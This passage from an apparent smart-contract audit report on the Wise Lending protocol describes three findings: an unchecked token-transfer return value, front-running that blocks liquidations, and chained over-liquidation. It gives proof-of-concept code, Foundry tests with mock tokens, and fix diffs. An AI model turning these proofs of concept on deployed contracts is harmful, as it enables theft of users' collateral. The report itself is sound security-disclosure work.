On some ERC-20 tokens, the [`transferFrom()` will return `false` on failure instead of reverting a transaction](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#no-revert-on-failure). I noticed that the `TransferHelper::_safeTransferFrom()`, which is used throughout the protocol, is vulnerable to detecting the token transfer failure if the `transferFrom()` returns `false` due to the unchecked return value bug.

The following lists the functions directly invoking the vulnerable `_safeTransferFrom()`:

1. [`WiseCore::_coreLiquidation()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L674-L679)
2. [`WiseLending::depositExactAmount()]`(https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L476-L481)
3. [`WiseLending::solelyDeposit()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L622-L627)
4. [`WiseLending::paybackExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L1190-L1195)
5. [`WiseLending::paybackExactShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L1230-L1235)
6. [`FeeManager::paybackBadDebtForToken()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L788-L793)
7. [`FeeManager::paybackBadDebtNoReward()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L860-L865)
8. [`PendlePowerFarm::_manuallyPaybackShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarm.sol#L136-L141)
9. [`PendlePowerManager::enterFarm()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerManager.sol#L109-L114)
10. [`PendlePowerFarmController::exchangeRewardsForCompoundingWithIncentive()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L86-L91)
11. [`PendlePowerFarmController::exchangeLpFeesForPendleWithIncentive()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L142-L147)
12. [`PendlePowerFarmController::lockPendle()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L397-L402)
13. [`PendlePowerFarmToken::addCompoundRewards()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L518-L523)
14. [`PendlePowerFarmToken::depositExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L579-L584)
15. [`AaveHub::depositExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L132-L137)
16. [`AaveHub::paybackExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L451-L456)
17. [`AaveHub::paybackExactShares()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WrapperHub/AaveHub.sol#L583-L588)

Due to the unchecked return value bug, users or attackers can exploit these protocol's functions without supplying a token (please refer to the `Proof of Concept` section for more details).

### Proof of Concept

> On some ERC-20 tokens, the [`transferFrom()` will return false on failure instead of reverting a transaction](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#no-revert-on-failure).

The `WiseLending` protocol implements the `TransferHub::_callOptionalReturn()` as a helper function for executing low-level calls. In case the `transferFrom()` returns `false` on failure, the `_callOptionalReturn()` will receive the returned parameters: [`success` `==` true and `returndata` `!=` `bytes(0)`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L21).

Then, the `_callOptionalReturn()` will decode the received `returndata` for the success status. If the `transferFrom()` returns `false`, the [results will become `false`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L26-L29).

With the `results` `==` `false`, finally, the `_callOptionalReturn()` will [return `false` to its function caller](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L35-L37).

On the `TransferHelper::_safeTransferFrom()`, I noticed that the function [does not evaluate the return value](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/TransferHelper.sol#L42) (i.e., unchecked return value bug) of the `_callOptionalReturn()`. Subsequently, the `_safeTransferFrom()` cannot detect the token transfer failure if the `transferFrom()` returns `false`.

```solidity
    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol
    function _callOptionalReturn(
        address token,
        bytes memory data
    )
        internal
        returns (bool call)
    {
        (
            bool success,
@1          bytes memory returndata //@audit -- On some tokens, the transferFrom() will return false instead of reverting a transaction
        ) = token.call(
            data
        );

@2      bool results = returndata.length == 0 || abi.decode(
@2          returndata, //@audit -- If the transferFrom() returns false, the results == false
@2          (bool)
@2      );

        if (success == false) {
            revert();
        }

@3      call = success
@3          && results // @audit -- If the results == false, the _callOptionalReturn() will return false
@3          && token.code.length > 0;
    }

    ...

    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/TransferHelper.sol
    function _safeTransferFrom(
        address _token,
        address _from,
        address _to,
        uint256 _value
    )
        internal
    {
@4      _callOptionalReturn( //@audit -- The _safeTransferFrom() cannot detect the token transfer failure if the transferFrom() returns false instead of reverting a transaction due to the unchecked return value bug
            _token,
            abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                _from,
                _to,
                _value
            )
        );
    }
```

`@1 -- On some tokens, the transferFrom() will return false instead of reverting a transaction`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L21>).

`@2 -- If the transferFrom() returns false, the results == false`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L26-L29>).

`@3 -- If the results == false, the _callOptionalReturn() will return false`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/CallOptionalReturn.sol#L35-L37>).

`@4 -- The _safeTransferFrom() cannot detect the token transfer failure if the transferFrom() returns false instead of reverting a transaction due to the unchecked return value bug`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/TransferHub/TransferHelper.sol#L42>).

Note: Please refer to the `Impact` section for a complete list of the functions directly invoking the vulnerable `_safeTransferFrom()`.

The following briefly analyzes 2 of the 17 functions that would affect the exploitation as examples:

- Due to the unchecked return value bug, the [`WiseCore::_coreLiquidation()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L674-L679) cannot be aware of the token transfer failure. Thus, a rogue liquidator can steal collateral from the target liquidable position without supplying any debt token (`tokenToPayback`).

- On the [`WiseLending::depositExactAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L476-L481), a rogue depositor can increase their collateral without spending any token.

```solidity
    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol
    function _coreLiquidation(
        CoreLiquidationStruct memory _data
    )
        internal
        returns (uint256 receiveAmount)
    {
        ...

@5      _safeTransferFrom( //@audit -- Liquidator can steal collateral (_receiveToken) from the target liquidable position
@5          _data.tokenToPayback,
@5          _data.caller,
@5          address(this),
@5          _data.paybackAmount
@5      );

        ...
    }

    ...

    // FILE: https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol
    function depositExactAmount(
        uint256 _nftId,
        address _poolToken,
        uint256 _amount
    )
        public
        syncPool(_poolToken)
        returns (uint256)
    {
        uint256 shareAmount = _handleDeposit(
            msg.sender,
            _nftId,
            _poolToken,
            _amount
        );

@6      _safeTransferFrom( //@audit -- Depositor can increase their collateral without supplying any token
@6          _poolToken,
@6          msg.sender,
@6          address(this),
@6          _amount
@6      );

        return shareAmount;
    }
```

`@5 -- Liquidator can steal collateral (_receiveToken) from the target liquidable position`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L674-L679>).

`@6 -- Depositor can increase their collateral without supplying any token`: see [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L476-L481>).

### Recommended Mitigation Steps

Improve the `_safeTransferFrom()` by checking the return value from the `_callOptionalReturn()` and reverting a transaction if it is `false`.

```diff
    function _safeTransferFrom(
        address _token,
        address _from,
        address _to,
        uint256 _value
    )
        internal
    {
-       _callOptionalReturn(
+       bool success = _callOptionalReturn(
            _token,
            abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                _from,
                _to,
                _value
            )
        );

+       require(success, "Token transfer failed");
    }
```

### Assessed type

Invalid Validation

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/245#issuecomment-2032204776):**
 > This then leads to some tokens unusable (like USDT, for example) and this topic was already discussed severely during hats competition where I can send links to findings, so should be scraped in my opinion. Also sufficient checks are already done in `_callOptionalReturn` directly.

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/245#issuecomment-2090406869):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).
> 
> Additionally, `WiseLending` is not meant to be used with corrupted tokens that have unsupported transfer/transferFrom implementations.
***

## [[M-08] Borrowers can DoS liquidations by repaying as little as 1 share.](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237)
*Submitted by [0xStalin](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237), also found by [Dup1337](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/185) and [Jorgect](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/144)*

Liquidations can be DoSed which increments the risk of bad debt being generated on position.

### Proof of Concept

When a liquidator is liquidating a position in `WiseLending`, the liquidator needs to specify the amount of shares to be repaid. The liquidation logic checks if the positions are indeed liquidable, if so, it validates if the number of shares to be liquidated exceeds the total amount of shares that can be liquidated by using the [`WiseSecurityHelper.checkMaxShares() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurityHelper.sol#L876-L900). If the amount of shares the liquidator intends to liquidate exceeds the maximum amount of liquidable shares, the execution is reverted.

- When the position has generated bad debt, the liquidation can liquidate all the user's `borrowShares` on the pool been liquidated.
- When the position has not generated bad debt, the maximum amount of liquidable shares is 50% of the existing user's `borrowShares` on the pool being liquidated.

The problem with this approach is that borrowers can frontrun the liquidation and repay as little as 1 share of the existing debt on the same pool that the liquidator decided to liquidate the debt from. This will cause when the liquidation is executed, the total borrow shares of the user on the pool being liquidated to be lower. If the liquidator was trying to liquidate the maximum possible amount of shares, now, the `maxShares` that can be liquidated will be slightly less than the amount of shares that the liquidator specified, which will cause the tx to revert.

```
    function checkMaxShares(
        uint256 _nftId,
        address _tokenToPayback,
        uint256 _borrowETHTotal,
        uint256 _unweightedCollateralETH,
        uint256 _shareAmountToPay
    )
        public
        view
    {
        //@audit-ok => total borrowShares a position owns for a _tokenToPayback pool
        uint256 totalSharesUser = WISE_LENDING.getPositionBorrowShares(
            _nftId,
            _tokenToPayback
        );

        //@audit-info => If baddebt, maxShares that can be liquidated are the totalSharesUser
        //@audit-info => If not baddebt, maxShares can be 50% of the total borrowShares
        uint256 maxShares = checkBadDebtThreshold(_borrowETHTotal, _unweightedCollateralETH)
            ? totalSharesUser
            : totalSharesUser * MAX_LIQUIDATION_50 / PRECISION_FACTOR_E18;

        if (_shareAmountToPay <= maxShares) {
            return;
        }

        //@audit-issue => reverts if the amount of shares to be repaid exceeds maxShares!
        revert TooManyShares();
    }
```

For example, if there is a position in a liquidable state that has 100 `borrowShares` on the `PoolA`, and a liquidator decides to liquidate the maximum possible amount of shares from this position, it will send a tx to liquidate 50 shares from that position on the `PoolA`. The position's owner can use the [`WiseLending.paybackExactShares() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1204-L1238) to repay 1 share and frontrun the liquidator's tx. Now, when the liquidator's tx is executed, the position is still liquidable, but it only has 99 `borrowShares` on the `PoolA`. As a result of this, the [`WiseSecurityHelper.checkMaxShares() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurityHelper.sol#L876-L900) will determine that the maximum possible amount of liquidable shares is 49.5, and because the liquidator specified that he intended to liquidate 50 shares, the tx will be reverted.

### Recommended Mitigation Steps

In the [`WiseSecurityHelper.checkMaxShares() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurityHelper.sol#L876-L900), if the `_shareAmountToPay` exceeds `maxShares`, don't revert; re-adjust the number of shares that can be liquidated. Return the final value of `_shareAmountToPay` and forward it back to the [`WiseLending.liquidatePartiallyFromTokens() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1250-L1309). Then, use the final value of `shareAmountToPay` to compute the exact amount of tokens to be repaid in the [`WiseLending.liquidatePartiallyFromTokens() function`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L1250-L1309).

`WiseSecurity.sol`:

```
    function checksLiquidation(
        ...
        uint256 _shareAmountToPay
    )
        external
        view
    +   returns (uint256)
    {
        ...


    -   checkMaxShares(
    +   return checkMaxShares( 
            _nftIdLiquidate,
            _tokenToPayback,
            borrowETHTotal,
            unweightedCollateralETH,
            _shareAmountToPay
        );
    }
```

`WiseSecurityHelper.sol`:

```
function checkMaxShares(
    ...
    uint256 _shareAmountToPay
)
    public
    view
+   returns (uint256)    
{
    ...

    uint256 maxShares = checkBadDebtThreshold(_borrowETHTotal, _unweightedCollateralETH)
            ? totalSharesUser
            : totalSharesUser * MAX_LIQUIDATION_50 / PRECISION_FACTOR_E18;

    if (_shareAmountToPay <= maxShares) {
-       return;
+       return _shareAmountToPay;
+   } else {
+       return maxShares;
+   }

-   revert TooManyShares();
}
```

`WiseLending.sol`:

```
    function liquidatePartiallyFromTokens(
        ...
        uint256 _shareAmountToPay
    )
        ...
    {
        ...

    -   data.shareAmountToPay = _shareAmountToPay;

        ...

        //@audit-info => First, determine the maximum amount of liquidable shares
    +   data.shareAmountToPay = WISE_SECURITY.checksLiquidation(
    +     _nftId,
    +     _paybackToken,
    +     _shareAmountToPay
    +   );

        //@audit-info => Then, compute the exact amount of tokens required to liquidate the final amount of liquidable shares
        data.paybackAmount = paybackAmount(
            _paybackToken,
    -       _shareAmountToPay
    +       data.shareAmountToPay
        );

        ...

    -   WISE_SECURITY.checksLiquidation(
    -       _nftId,
    -       _paybackToken,
    -       _shareAmountToPay
    -   );

        ...
    }
```

### Assessed type

Context

**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237#issuecomment-2009554797):**
 > Instead of wasting gas by frontrunning a newbie liquidator they could also make money and liquidate themselves. On Arbitrum it's not possible at all. If liquidators don't use tools like flashbots or eden, it's their own fault. No reason to do anything here, in my opinion. Dismissed.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237#issuecomment-2020890116):**
 > Whether the option for liquidators to bypass hacks through private mempools is grounds for reducing severity of their abuse is not a trivial question and would best be standardized in the Supreme Court.
> 
> I'm taking a stance that this cheap hack is annoying enough for liquidators to be worth Medium severity. Note that if private mempool is in-scope, attacker can use it as well and insert the annoying TX at start of block.

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/237#issuecomment-2090437915):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).
>
> Mentioned issue does not seem to be in interest of the borrower, since borrower is more incentivized to perform self-liquidation to earn than preventing others, which becomes a race on who will liquidate first making liquidation a more desired outcome for both parties, no intention to gate the minimum payback threshold by admin.
***

## [[M-09] Liquidating chaining can be achieved by liquidating token collateral with the highest `collateralFactor`](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/202)
*Submitted by [Draiakoo](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/202)*

The liquidation mechanism is intended as follows:

- If a user has more borrowed value than weighted collateral, but it does not surpass the 89% of the unweighted collateral, he can be liquidated up to 50% of his borrowed shares.
- When the borrowed amount surpass the 89% of the unweighted collateral, then it is considered bad debt and the position can be fully liquidated

This feature is programmed [here](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseSecurity/WiseSecurityHelper.sol#L876-L900)

However, since the liquidator can select which collateral he will receive, he can intentionally liquidate the highest `collateralFactor` tokens in order to make the overall position's `collateralFactor` to go down and being able to keep liquidating the other tokens. Since the intended maximum amount to liquidate when the position has no bad debt is 50%, if a user can intentionally create a sequence of liquidation that leads to a greater percentage it can be considered a high impact vulnerability.

### Written Proof of Concept

Imagine the following situation:

The protocol supports these 4 tokens, A, B, C and D with these `collateralFactors`:

| Token | Collateral factor |
| :---- | ----------------: |
| A     |              0.85 |
| B     |              0.65 |
| C     |              0.50 |
| D     |              0.70 |

The initial prices for these tokens are as follows:

| Token | Price (in ETH) |
| :---- | -------------: |
| A     |              1 |
| B     |            0.2 |
| C     |            0.5 |
| D     |              1 |

Alice deposits these 3 amounts of token A, B and C as collateral:

| Token | Value |       Amount | Unweighted value | Weighted value |
| :---- | ----: | -----------: | ---------------: | -------------: |
| A     |     1 |           10 |               10 |            8.5 |
| B     |   0.2 |           50 |               10 |            6.5 |
| C     |   0.5 |           20 |               10 |              5 |
|       |       | Total values |               30 |             20 |

Alice can borrow up to `20 * 0.95 = 19` worth of ETH. For the sake of simplicity, since token D is valued 1 ETH, she can borrow up to 19 of token D. However, she decides to borrow 18.9 to have a tiny healthy zone. Unfortunately for Alice, the price of token C drops to 0.25. And the situation continues as follows:

| Token | Value |       Amount | Unweighted value | Weighted value |
| :---- | ----: | -----------: | ---------------: | -------------: |
| A     |     1 |           10 |               10 |            8.5 |
| B     |   0.2 |           50 |               10 |            6.5 |
| C     |  0.25 |           20 |                5 |            2.5 |
|       |       | Total values |               25 |           17.5 |

In this stage, Alice can be liquidated up to 50% because her borrowed amount (18.9 ETH) is greater than her weighted value (17.5 ETH). Just 50% is liquidable because the 89% of her weighted value is greater than her borrowed amount.

Let's now demonstrate that if the liquidator receives the token with the highest `collateralFactor`, the position will still be liquidable and he can chain this function call in order to liquidate a huge amount of collateral.

The liquidator decides to repay 9.09 shares of token D. He intentionally selects this amount because when added to the fee (10%), the total amount will be 10 worth of ETH. Hence, liquidating this amount, the user is liquidating the whole token A collateral from Alice with the highest `collateralFactor`. The new borrowed value from Alice would be `18.9 - 9.09 = 9.81`.

| Token | Value |       Amount | Unweighted value | Weighted value |
| :---- | ----: | -----------: | ---------------: | -------------: |
| A     |     1 |            0 |                0 |              0 |
| B     |   0.2 |           50 |               10 |            6.5 |
| C     |  0.25 |           20 |                5 |            2.5 |
|       |       | Total values |               15 |              9 |

We can clearly see that the borrowed value is still greater than Alice's weighted value. Hence, she can be liquidated again! See Coded Proof of Concept to see the full chain liquidation.

The scenario completely changes if the liquidator would be forced to liquidate the collateral with the lowest `collateralFactor`. The liquidator is forced to receive token C (lowest `collateralFactor`). He decides to repay 4.54 worth of token D that when added with the fee (10%) will be 5. The whole value of collateral token C.

| Token | Value |       Amount | Unweighted value | Weighted value |
| :---- | ----: | -----------: | ---------------: | -------------: |
| A     |     1 |           10 |               10 |            8.5 |
| B     |   0.2 |           50 |               10 |            6.5 |
| C     |  0.25 |            0 |                0 |              0 |
|       |       | Total values |               20 |             15 |

The new borrowed value would be `18.9 - 4.54 = 14.36`. This new borrowed value is smaller than the weighted value. Thus, Alice is no longer liquidable and her position is healthy. See coded Proof of Concept.

### Coded Proof of Concept

For the sake of testing, I adjusted the collateral factors manually when deploying the protocol locally:

```
            createPoolArray[0] = PoolManager.CreatePool(
                {	
    				// Token A
                    allowBorrow: true,
                    poolToken: address(MOCK_ERC20_1),
                    poolMulFactor: 17500000000000000,
                    poolCollFactor: 0.85 ether,
                    maxDepositAmount: 10000000000000 ether
                }
            );

            createPoolArray[1] = PoolManager.CreatePool(
                {
    				// Token B
                    allowBorrow: true,
                    poolToken: address(MOCK_ERC20_2),
                    poolMulFactor: 25000000000000000,
                    poolCollFactor: 0.65 ether,
                    maxDepositAmount: 10000000000000 ether
                }
            );

            createPoolArray[2] = PoolManager.CreatePool(
                {
    				// Token C
                    allowBorrow: true,
                    poolToken: address(MOCK_ERC20_3),
                    poolMulFactor: 15000000000000000,
                    poolCollFactor: 0.5 ether,
                    maxDepositAmount: 10000000000000 ether
                }
            );

            createPoolArray[3] = PoolManager.CreatePool(
                {
    				// Token D
                    allowBorrow: true,
                    poolToken: address(MOCK_WETH),
                    poolMulFactor: 17500000000000000,
                    poolCollFactor: 0.7 ether,
                    maxDepositAmount: 10000000000000 ether
                }
            );
```

And also created a function inside the `MockChainlink` to set the prices of the tokens:

```
    	function setNewPrice(uint256 newPrice) public {
            ethValuePerToken = newPrice;
        }
```

With all that said, let's see the PoC for the 2 previously explained situations:

Alice can be liquidated multiple times:

```
        function testChainLiquidation() public {
            address token1 = 0xfDf134B61F8139B8ea447eD49e7e6adf62fd4B49;
            address token2 = 0xEa3aF45ae5a2bAc059Cd026f23E47bdD753E664a;
            address token3 = 0x15BB461b3a994218fD0D6329E129846F366FFeB3;
            address token4 = 0x6B9d657Df9Eab179c44Ff9120566A2d423d01Ea9;

            testDeployLocal();
            skip(1000);

            // Add some tokens4 to have enough liquidity
            address thirdParty = makeAddr("thirdParty");
            deal(address(token4), thirdParty, 1_000_000 ether);
            vm.startPrank(thirdParty);
            IERC20(token4).approve(address(LENDING_INSTANCE), 1_000_000 ether);
            LENDING_INSTANCE.depositExactAmountMint(token4, 1_000_000 ether);
            vm.stopPrank();

            // Initially the price for tokens are:
            // 1 Token1 = 1 ETH
            MOCK_CHAINLINK_1.setNewPrice(1 ether);
            // 1 Token2 = 0.2 ETH
            MOCK_CHAINLINK_2.setNewPrice(0.2 ether);
            // 1 Token3 = 0.5 ETH
            MOCK_CHAINLINK_3.setNewPrice(0.5 ether);
            // 1 Token4 = 1 ETH
            MOCK_CHAINLINK_4.setNewPrice(1 ether);

            // Bob is liquidating Alice
            address alice = makeAddr("alice");
            address bob = makeAddr("bob");
            deal(token1, alice, 10 ether);
            deal(token2, alice, 50 ether);
            deal(token3, alice, 20 * 10**6);
            deal(token4, bob, 200 ether);

            vm.startPrank(alice);
            IERC20(token1).approve(address(LENDING_INSTANCE), 10 ether);
            LENDING_INSTANCE.depositExactAmountMint(token1, 10 ether);
            IERC20(token2).approve(address(LENDING_INSTANCE), 50 ether);
            LENDING_INSTANCE.depositExactAmount(6, token2, 50 ether);
            IERC20(token3).approve(address(LENDING_INSTANCE), 20 * 10**6);
            LENDING_INSTANCE.depositExactAmount(6, token3, 20 * 10**6);
            LENDING_INSTANCE.borrowExactAmount(6, token4, 18.9 ether);
            uint256 initialBorrowShares = LENDING_INSTANCE.getPositionBorrowShares(6, token4);
            vm.stopPrank();

            // Time passes and value of token3 drops significantly
            // 1 Token3 = 0.25 ETH
            MOCK_CHAINLINK_3.setNewPrice(0.25 ether);

            vm.startPrank(bob);
            IERC20(token4).approve(address(LENDING_INSTANCE), 200 ether);
            LENDING_INSTANCE.depositExactAmountMint(token4, 10 ether);
            LENDING_INSTANCE.liquidatePartiallyFromTokens(6, 7, token4, token1, 9.090909090909 ether);
            LENDING_INSTANCE.liquidatePartiallyFromTokens(6, 7, token4, token2, 2.7 ether);
            LENDING_INSTANCE.liquidatePartiallyFromTokens(6, 7, token4, token2, 3.5 ether);
            vm.stopPrank();

            uint256 finalBorrowShares = LENDING_INSTANCE.getPositionBorrowShares(6, token4);

            uint256 percentageLiquidated = 100 - (finalBorrowShares * 100 / initialBorrowShares);
            console.log("Percentage liquidated", percentageLiquidated);
        }
```

Result:

```
    [PASS] testChainLiquidation() (gas: 44546965)
    Logs:
      Percentage liquidated 81

    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 38.40ms

    Ran 1 test suite in 38.40ms: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

With 3 liquidation calls, the liquidator could repay 81% of Alice's position when in fact, the maximum percentage that the protocol allows when there is no bas debt is 50%.

Alice can only be liquidated once with the asset with lowest `collateralFactor` and then her position becomes healthy:

```
        function testLiquidationsConstrainted() public {
            address token1 = 0xfDf134B61F8139B8ea447eD49e7e6adf62fd4B49;
            address token2 = 0xEa3aF45ae5a2bAc059Cd026f23E47bdD753E664a;
            address token3 = 0x15BB461b3a994218fD0D6329E129846F366FFeB3;
            address token4 = 0x6B9d657Df9Eab179c44Ff9120566A2d423d01Ea9;

            uint256 aliceNftPosition = 6;
            uint256 bobNftPosition = 7;

            testDeployLocal();
            skip(1000);

            // Add some tokens4 to have enough liquidity
            address thirdParty = makeAddr("thirdParty");
            deal(address(token4), thirdParty, 1_000_000 ether);
            vm.startPrank(thirdParty);
            IERC20(token4).approve(address(LENDING_INSTANCE), 1_000_000 ether);
            LENDING_INSTANCE.depositExactAmountMint(token4, 1_000_000 ether);
            vm.stopPrank();

            // Initially the price for tokens are:
            // 1 Token1 = 1 ETH
            MOCK_CHAINLINK_1.setNewPrice(1 ether);
            // 1 Token2 = 0.2 ETH
            MOCK_CHAINLINK_2.setNewPrice(0.2 ether);
            // 1 Token3 = 0.5 ETH
            MOCK_CHAINLINK_3.setNewPrice(0.5 ether);
            // 1 Token4 = 1 ETH
            MOCK_CHAINLINK_4.setNewPrice(1 ether);

            // Bob is liquidating Alice
            address alice = makeAddr("alice");
            address bob = makeAddr("bob");
            deal(token1, alice, 10 ether);
            deal(token2, alice, 50 ether);
            deal(token3, alice, 20 * 10**6);
            deal(token4, bob, 200 ether);

            vm.startPrank(alice);
            IERC20(token1).approve(address(LENDING_INSTANCE), 10 ether);
            LENDING_INSTANCE.depositExactAmountMint(token1, 10 ether);
            IERC20(token2).approve(address(LENDING_INSTANCE), 50 ether);
            LENDING_INSTANCE.depositExactAmount(aliceNftPosition, token2, 50 ether);
            IERC20(token3).approve(address(LENDING_INSTANCE), 20 * 10**6);
            LENDING_INSTANCE.depositExactAmount(aliceNftPosition, token3, 20 * 10**6);
            LENDING_INSTANCE.borrowExactAmount(aliceNftPosition, token4, 18.9 ether);
            uint256 initialBorrowShares = LENDING_INSTANCE.getPositionBorrowShares(aliceNftPosition, token4);
            vm.stopPrank();

            // Time passes and value of token3 drops significantly
            // 1 Token3 = 0.25 ETH
            MOCK_CHAINLINK_3.setNewPrice(0.25 ether);

            vm.startPrank(bob);
            IERC20(token4).approve(address(LENDING_INSTANCE), 200 ether);
            LENDING_INSTANCE.depositExactAmountMint(token4, 10 ether);
            LENDING_INSTANCE.liquidatePartiallyFromTokens(aliceNftPosition, bobNftPosition, token4, token3, 4.54 ether);

            // Having liquidated the token with less LVT, the position is no longer liquidable
            // Try to liquidate with the minimum amount of shares (1)
            vm.expectRevert();
            LENDING_INSTANCE.liquidatePartiallyFromTokens(aliceNftPosition, bobNftPosition, token4, token3, 1);
            vm.stopPrank();

            uint256 finalBorrowShares = LENDING_INSTANCE.getPositionBorrowShares(aliceNftPosition, token4);

            uint256 percentageLiquidated = 100 - (finalBorrowShares * 100 / initialBorrowShares);
            console.log("Percentage liquidated", percentageLiquidated);
        }
```

Result:

```
    [PASS] testLiquidationsConstrainted() (gas: 44044788)
    Logs:
      Percentage liquidated 25

    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 40.81ms

    Ran 1 test suite in 40.81ms: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

With just a single liquidation call, the liquidator could only repay 25% of Alice's position and at that point, her position becomes healthy and she is no longer liquidable.

### Recommended Mitigation Steps

This issue can be easily solved by forcing all liquidations to be done with the lowest `collateralFactor` tokens first. As shown in the written and coded PoC, if the user would have been forced to receive the collateral token with the lowest `collateralFactor`, the health of the position would go to non-liquidable and the liquidator would not be able to continue liquidating the position.

